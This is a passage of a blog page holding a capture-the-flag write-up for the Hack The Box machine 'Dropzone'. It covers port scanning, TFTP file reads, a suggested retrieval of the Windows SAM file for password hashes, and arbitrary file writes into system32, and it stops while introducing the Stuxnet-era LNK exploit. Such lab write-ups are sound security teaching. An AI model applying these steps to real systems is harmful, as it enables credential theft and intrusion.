@@ -1,0 +1,720 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.51" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hack The Box Write-up - Dropzone | text/plain</title>
+    <meta name="description" content="Write-up for the machine Dropzone from Hack The Box.
+This is a very interesting box since you have to get in only by writing files
+to arbitrary locations. An initial TCP port scan returns no open ports at
+all, only after scanning UDP you find an open TFTP daemon on port 69. After
+playing with it a little, you find out the box is an old Windows XP machine and
+you can read and write anywhere. The flag is hidden so you need a shell to
+explore the system. Remembering the old Stuxnet exploits, you can find a way in
+by exploiting Windows WMI with a malicious MOF file uploaded to a special
+folder. The last step to get both flags is to read the ADS of the hidden file,
+which only works after uploading the streams.exe tools from Sysinternals.">
+    <meta name="keywords" content="ctf, infosec, hackthebox, write-up">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Hack The Box Write-up - Dropzone" />
+<meta property="og:description" content="Write-up for the machine Dropzone from Hack The Box.
+This is a very interesting box since you have to get in only by writing files
+to arbitrary locations. An initial TCP port scan returns no open ports at
+all, only after scanning UDP you find an open TFTP daemon on port 69. After
+playing with it a little, you find out the box is an old Windows XP machine and
+you can read and write anywhere. The flag is hidden so you need a shell to
+explore the system. Remembering the old Stuxnet exploits, you can find a way in
+by exploiting Windows WMI with a malicious MOF file uploaded to a special
+folder. The last step to get both flags is to read the ADS of the hidden file,
+which only works after uploading the streams.exe tools from Sysinternals." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/htb_dropzone/" /><meta property="article:published_time" content="2018-11-03T00:00:00&#43;01:00"/>
+<meta property="article:modified_time" content="2018-11-03T00:00:00&#43;01:00"/>
+
+    
+
+
+
+  <meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/htb_dropzone/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="active" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    
+<meta itemprop="name" content="Hack The Box Write-up - Dropzone">
+<meta itemprop="description" content="Write-up for the machine Dropzone from Hack The Box.
+This is a very interesting box since you have to get in only by writing files
+to arbitrary locations. An initial TCP port scan returns no open ports at
+all, only after scanning UDP you find an open TFTP daemon on port 69. After
+playing with it a little, you find out the box is an old Windows XP machine and
+you can read and write anywhere. The flag is hidden so you need a shell to
+explore the system. Remembering the old Stuxnet exploits, you can find a way in
+by exploiting Windows WMI with a malicious MOF file uploaded to a special
+folder. The last step to get both flags is to read the ADS of the hidden file,
+which only works after uploading the streams.exe tools from Sysinternals.">
+
+
+<meta itemprop="datePublished" content="2018-11-03T00:00:00&#43;01:00" />
+<meta itemprop="dateModified" content="2018-11-03T00:00:00&#43;01:00" />
+<meta itemprop="wordCount" content="2025">
+
+
+
+<meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
+
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Hack The Box Write-up - Dropzone</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>10 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2018-11-03T00:00:00&#43;01:00">3 Nov, 2018</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">Write-up for the machine Dropzone from Hack The Box.
+This is a very interesting box since you have to get in only by writing files
+to arbitrary locations. An initial TCP port scan returns no open ports at
+all, only after scanning UDP you find an open TFTP daemon on port 69. After
+playing with it a little, you find out the box is an old Windows XP machine and
+you can read and write anywhere. The flag is hidden so you need a shell to
+explore the system. Remembering the old Stuxnet exploits, you can find a way in
+by exploiting Windows WMI with a malicious MOF file uploaded to a special
+folder. The last step to get both flags is to read the ADS of the hidden file,
+which only works after uploading the streams.exe tools from Sysinternals.</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#enumeration">Enumeration</a>
+<ul>
+<li><a href="#port-scan">Port scan</a></li>
+<li><a href="#tftp-enumeration">TFTP enumeration</a></li>
+</ul></li>
+<li><a href="#exploiting-tftp">Exploiting TFTP</a>
+<ul>
+<li><a href="#ms10-046-and-lnk-files-won-t-work">MS10-046 and LNK files - won&rsquo;t work</a></li>
+<li><a href="#ms10-061-and-mof-files-will-work">MS10-061 and MOF files - will work</a></li>
+</ul></li>
+<li><a href="#getting-the-flag-from-ads">Getting the flag from ADS</a></li>
+<li><a href="#references">References</a></li>
+</ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      
+
+<h1 id="enumeration">Enumeration</h1>
+
+<h2 id="port-scan">Port scan</h2>
+
+<p>As usual, start with a quick port scan to identify open ports for inspection:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ masscan -e tun0 -p <span style="color: #ae81ff">1</span>-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.90
+
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-10-08 20:55:02 GMT
+-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+</code></pre></div>
+
+<p>Not a single open port was identified. Instead of debugging
+<a href="https://github.com/robertdavidgraham/masscan">masscan</a>, checking the VPN
+connection, trying out all sorts of firewall evasion techniques, or going crazy
+otherwise, remember port scans do TCP by default but can do UDP as well:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>$ masscan -e tun0 -p U:1-65535 --rate <span style="color: #ae81ff">2000</span> <span style="color: #ae81ff">10</span>.10.10.90
+...
+Discovered open port 69/udp on 10.10.10.90
+</code></pre></div>
+
+<p>Now there is an open port, suggesting a
+<a href="https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol">TFTP</a> service at
+UDP 69. With nmap we can find out more:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ nmap -sV -sC -sU -p <span style="color: #ae81ff">69</span> <span style="color: #ae81ff">10</span>.10.10.90
+Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-14 17:00 EDT
+Nmap scan report for 10.10.10.90
+Host is up (0.046s latency).
+
+PORT   STATE SERVICE VERSION
+69/udp open  tftp    SolarWinds Free tftpd
+</code></pre></div>
+
+<p>Nmap confirms there is TFTP running and identifies it as the <a href="https://www.solarwinds.com/">SolawWinds TFTP
+server</a>. A little bit of background: TFTP is a
+very minimalistic (&ldquo;trivial&rdquo;) file transfer protocol. It only supports uploading
+and downloading files. Listing directories, deleting files, authenticating
+users, using TCP, &hellip; all bloat that would make the implementation too
+complicated. That is why you would never use it on the internet. Managing the
+configurations of routers, switches and the like on the local network seems to be a <a href="https://www.linux.com/learn/sysadmin/2017/3/trivial-transfers-tftp-part-1-why-use-it">use
+case</a>
+though. Indeed, the
+<a href="https://docs.fusionpbx.com/en/latest/additional_information/tftp.html">docs</a>
+of <a href="https://www.fusionpbx.com/">FusionPBX</a> suggests TFTP is still required for
+lots of phone hardware, so chances are that you may actually encounter such a
+service in reality even today.</p>
+
+<p>That was just me asking myself why anybody would use TFTP. Going forward, we
+can expect to be able to read and possibly write files on the box. Let&rsquo;s see
+what we can do.</p>
+
+<h2 id="tftp-enumeration">TFTP enumeration</h2>
+
+<p>There are numerous blog posts about Windows LFI that may give you an idea what
+to look for (e.g.,
+<a href="https://www.gracefulsecurity.com/path-traversal-cheat-sheet-windows/">here</a>).
+We connect with <code>tftp</code> and start with the basics. After connecting, you can use
+the <code>get</code> command to receive files. TFTP will let you know if the files exist:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ tftp <span style="color: #ae81ff">10</span>.10.10.90
+tftp&gt; get non-existing-file
+Error code 1: Could not find file &#39;C:\non-existing-file&#39;.
+
+tftp&gt; get WINDOWS\System32\drivers\etc\hosts
+Received 734 bytes in 0.1 seconds [58720 bits/sec]
+</code></pre></div>
+
+<p>After getting a file, you will find it in your current directory. So let&rsquo;s read
+some interesting files. With <code>get /boot.ini</code>, we find out that the box runs
+Windows XP:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ cat boot.ini
+[boot loader]
+timeout=30
+default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
+[operating systems]
+multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=&quot;Microsoft Windows XP Professional&quot; /noexecute=optin /fastdetect
+</code></pre></div>
+
+<p>Using <code>get /Windows/System32/eula.txt</code> we can further see it is Windows XP
+Professional Service Pack 3:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ head -n <span style="color: #ae81ff">6</span> eula.txt
+END-USER LICENSE AGREEMENT FOR MICROSOFT
+SOFTWARE
+
+MICROSOFT WINDOWS XP PROFESSIONAL EDITION
+SERVICE PACK 3
+</code></pre></div>
+
+<p>After that, I spent some time poking around the system to find sensitive files
+or hints about other services that may run. For instance, you can also <code>get
+windows\repair\SAM</code> and probably could extract some password hashes. But that
+is all useless as all you can do is connect to the TFTP server.</p>
+
+<h1 id="exploiting-tftp">Exploiting TFTP</h1>
+
+<p>One way to get into the box could have been to exploit the TFTP service.
+Check <code>searchsploit</code> and it returns a long list of DOS attacks and a directory
+traversals. Not much useful information here, since we know already that we can
+read pretty much everything.</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span> $ searchsploit solarwinds
+----------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                         |  Path
+                                                                       | (/usr/share/exploitdb/)
+----------------------------------------------------------------------- ----------------------------------------
+...
+SolarWinds TFTP Server 10.4.0.10 - Denial of Service                   | exploits/windows/dos/12683.pl
+SolarWinds TFTP Server 10.4.0.13 - Denial of Service                   | exploits/windows/dos/13836.py
+SolarWinds TFTP Server 9.2.0.111 - Remote Denial of Service            | exploits/windows/dos/9547.pl
+SolarWinds TFTP Server Standard Edition 5.0.55 - Directory Traversal   | exploits/windows/remote/21964.txt
+SolarWinds TFTP Server Standard Edition 5.0.55 - Large UDP Packet      | exploits/windows/dos/21963.pl
+...
+</code></pre></div>
+
+<p>What is interesting though is that we seem to be able to write files on the remote
+system to any location, e.g., into the &ldquo;system32&rdquo; folder, which should be
+protected:</p>
+<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-console" data-lang="console"><span></span>tftp&gt; put eula.txt /Windows/system32/eula.txt
+Sent 41543 bytes in 5.0 seconds
+</code></pre></div>
+
+<p>This observation either gives you the right idea, or you spend some quality time with
+Google until you discover how the ability to write files on Windows XP can help
+you. Below a summary of my journey:</p>
+
+<h2 id="ms10-046-and-lnk-files-won-t-work">MS10-046 and LNK files - won&rsquo;t work</h2>
+
+<p>The main question to start with is what can be done to Windows computers with
+arbitrary writes to any locations. If you remember how the
+<a href="https://en.wikipedia.org/wiki/Stuxnet">Stuxnet</a> worm was able to infect so
+many machines back in 2010 then you can see such ways. The most famous
+probably is the one in which you create a Windows Shortcut (LNK file),
+accompanied by a payload file, and that payload will be executed the moment
+somebody browses the LNK in the explorer. The original vulnerability was
+<a href="https://www.rapid7.com/db/modules/exploit/windows/smb/ms10_046_shortcut_icon_dllloader">MS10-046</a>,
+newer versions are
